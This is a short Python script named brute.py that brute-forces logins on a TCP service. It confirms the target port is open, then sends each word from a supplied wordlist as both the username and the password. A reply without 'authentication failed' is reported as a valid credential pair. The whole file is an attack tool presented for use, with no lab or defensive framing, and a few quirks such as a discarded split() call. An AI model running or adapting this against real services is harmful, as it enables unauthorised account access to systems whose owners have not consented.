#!/usr/bin/python

import requests
import sys
import socket

if len(sys.argv) > 3:
	target = sys.argv[1]
	port = int(sys.argv[2])
	wordlist = sys.argv[3]
else:
	print("Usage: ./brute.py <target> <port> <wordlist>")
	sys.exit(1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	status = s.connect_ex((target,port))
	s.close()
	if status == 0:
		pass
	else:
		print("[!] Error: the specified target is unreachable.")
		sys.exit(1)
except socket.error:
	print("[!] Error: the specified target is unreachable.")
	sys.exit(1)

try:
	def brute(target,port):
		for line in file:
			word = line.split()
			word = line.strip()
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target,port))
			s.recv(1024)
			s.send(word+"\n")
			result = s.recv(1024)
			s.send(word+"\n")
			result = s.recv(1024)
			s.close()
			if "authentication failed" in result:
				pass
			else:
				print("[+] Valid combination found: " + word + ':' + word)
				sys.exit(1)
except:
	print("[!] Error: an unexpected error occurred.")

with open(wordlist) as file:
	brute(target,port)

print("[!] No valid combinations found.")
